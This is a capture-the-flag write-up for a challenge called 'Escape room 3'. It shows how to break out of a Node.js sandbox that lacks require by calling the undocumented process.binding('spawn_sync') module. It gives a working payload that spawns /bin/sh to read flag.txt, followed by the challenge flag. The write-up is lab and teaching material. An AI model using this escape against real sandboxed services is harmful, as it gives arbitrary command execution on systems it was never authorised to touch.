# Escape room 3

## Write-up

Since we do not have access to require, we have to use the `process.binding` function which import internal NodeJS module that are not documented. In this case, the binding module `spawn_sync` and its function `spawn` is used.

The payload is:

```javascript
console.log(
  process
    .binding("spawn_sync")
    .spawn({
      shell: true,
      args: ["/bin/sh", "-c", "cat flag.txt"],
      file: "/bin/sh",
      stdio: [
        { type: "pipe", readable: true, writable: false },
        { type: "pipe", readable: false, writable: true },
        { type: "pipe", readable: false, writable: true },
      ],
    })
    .output[1].toString()
);
```

## Flag

`flag-1310d81cb545ee06af252f9191af473b`
